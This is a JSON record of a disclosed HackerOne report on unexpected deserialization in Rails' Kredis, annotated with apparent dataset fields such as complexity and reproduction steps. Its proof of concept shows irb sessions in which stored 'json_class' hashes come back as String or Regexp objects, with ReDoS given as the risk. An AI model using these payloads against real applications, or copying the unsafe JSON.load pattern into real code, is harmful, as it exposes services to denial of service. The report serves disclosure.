{
  "reported_to": "Ruby on Rails",
  "reported_by": "ooooooo_q ",
  "title": "Unexpected deserialization in Kredis",
  "content": "\nUnexpected classes may be deserialized because JSON.load is used to cast json in Kredis.\nhttps://github.com/rails/kredis/blob/v1.3.0/lib/kredis/type/json.rb\nCode 172 Bytes\n1module Kredis\n2  module Type\n3    class Json < ActiveModel::Type::Value\n4      def type\n5        :json\n6      end\n7\n8      def cast_value(value)\n9        JSON.load(value)\n10      end\nPoC\nprepare kredis with rails\nCode 195 Bytes\n1\u276f rails new rails_server -G -M -O -C -A -J -T\n2# Rails 7.0.4 install\n3\n4\u276f cd rails_server\n5\n6# Edit Gemfile to uncomment `gem \"kredis\"` \n7\u276f bundle install\n8# kredis 1.3.0 install\n9\n10\u276f rails kredis:install\nCode 385 Bytes\n1\u276f bundle exec rails c\n2Loading development environment (Rails 7.0.4)\n3irb(main):001:0> abc = 'abc'.to_json_raw_object\n4=> {\"json_class\"=>\"String\", \"raw\"=>[97, 98, 99]}\n5\n6irb(main):002:0> json = Kredis.json \"json_load\"\n7=>\n8#<Kredis::Types::Scalar:0x00000001099ea250\n9...\n10\n11irb(main):003:0> json.value = abc\n12=> {\"json_class\"=>\"String\", \"raw\"=>[97, 98, 99]}\n13\n14irb(main):004:0> json.value\n15=> \"abc\"\nThe return value of json.value should be a hash object, but it is deserialized as a string object.\nCode 388 Bytes\n1irb(main):005:0> json.value = /test/\n2=> /test/\n3\n4irb(main):006:0> json.value\n5=> \"(?-mix:test)\"\n6\n7irb(main):007:0> json.value = /test/.as_json\n8=> \"(?-mix:test)\"\n9\n10irb(main):008:0> json.value\n11=> \"(?-mix:test)\"\n12\n13irb(main):009:0> require 'json/add/core'\n14=> true\n15\n16irb(main):010:0> json.value = /test/.as_json\n17=> {\"json_class\"=>\"Regexp\", \"o\"=>0, \"s\"=>\"test\"}\n18\n19irb(main):011:0> json.value\n20=> /test/\nIf json/add/core is loaded, classes such as regular expressions can also be deserialized.\nImpact\nIf a hash is passed to Kredis.json by user input, reading the value may cause unexpected problems.\nThe only deserializable classes are those with self.json_create declared, usually String class are possible.(https://github.com/flori/json/blob/v2.6.2/lib/json/pure/generator.rb#L434)\nIf json/add/core is loaded, it is possible to deserialize RegExp, etc., thus risking ReDoS, etc.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1692175800,
  "report_url": "https://hackerone.com/reports/1702859",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a new Rails application and install Kredis"
    ],
    [
      2,
      "Use Kredis.json to store a value that includes a JSON payload with 'json_class' attribute"
    ],
    [
      3,
      "Retrieve the stored value to observe unexpected deserialization"
    ]
  ],
  "vuln_description": "The vulnerability involves unexpected deserialization of classes in Kredis due to the use of JSON.load for casting JSON values. This can lead to deserialization of unexpected classes, including potentially dangerous ones like Regexp, if 'json/add/core' is loaded, posing risks such as ReDoS.",
  "reason": "The vulnerability requires understanding of JSON deserialization behaviors and the specific use of JSON.load in Kredis. While the setup is straightforward, recognizing the potential for deserialization of unexpected classes requires insight into JSON's handling of 'json_class' attributes and the implications of loading 'json/add/core'.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}